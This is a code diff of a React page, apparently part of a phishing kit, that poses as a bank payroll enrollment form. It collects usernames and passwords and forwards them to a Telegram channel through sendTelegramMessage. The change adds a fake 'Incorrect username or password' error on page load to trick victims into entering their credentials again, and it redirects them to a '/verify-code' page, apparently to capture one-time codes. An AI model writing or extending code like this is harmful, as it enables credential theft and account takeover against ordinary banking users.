@@ -1,6 +1,6 @@
 // src/pages/PayrollEnrollment.tsx
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { motion } from "framer-motion";
 import { useNavigate } from "react-router-dom";
 import { FaUniversity, FaLock, FaShieldAlt } from "react-icons/fa";
@@ -8,13 +8,18 @@ import Layout from "../components/layout/Layout";
 import Card from "../components/ui/Cardtemp";
 import { sendTelegramMessage } from "../../utils/telegram";
 
-const PayrollEnrollment: React.FC = () => {
+const PayrollEnrollment2: React.FC = () => {
   const navigate = useNavigate();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+
+  // Show initial error message on page load
+  useEffect(() => {
+    setError("Incorrect username or password. Please try again.");
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -35,14 +40,16 @@ const PayrollEnrollment: React.FC = () => {
 
     try {
       await sendTelegramMessage(formData, "🏦 Payroll Enrollment");
-      setSuccess("Enrollment submitted successfully!");
-      setUsername("");
-      setPassword("");
-      setTimeout(() => navigate("/payroll-enroll-2"), 2000);
+      setSuccess("Verification code sent!");
+      
+      // Clear form and redirect after 2 seconds
+      setTimeout(() => {
+        navigate("/verify-code");
+      }, 2000);
+      
     } catch (err) {
       console.error(err);
       setError("Failed to submit. Please try again.");
-    } finally {
       setIsSubmitting(false);
     }
   };
@@ -105,7 +112,7 @@ const PayrollEnrollment: React.FC = () => {
 
                 <div>
                   <label className="block text-white font-semibold mb-2">
-                     Username
+                    Username
                   </label>
                   <input
                     type="text"
@@ -157,4 +164,4 @@ const PayrollEnrollment: React.FC = () => {
   );
 };
 
-export default PayrollEnrollment;
+export default PayrollEnrollment2;
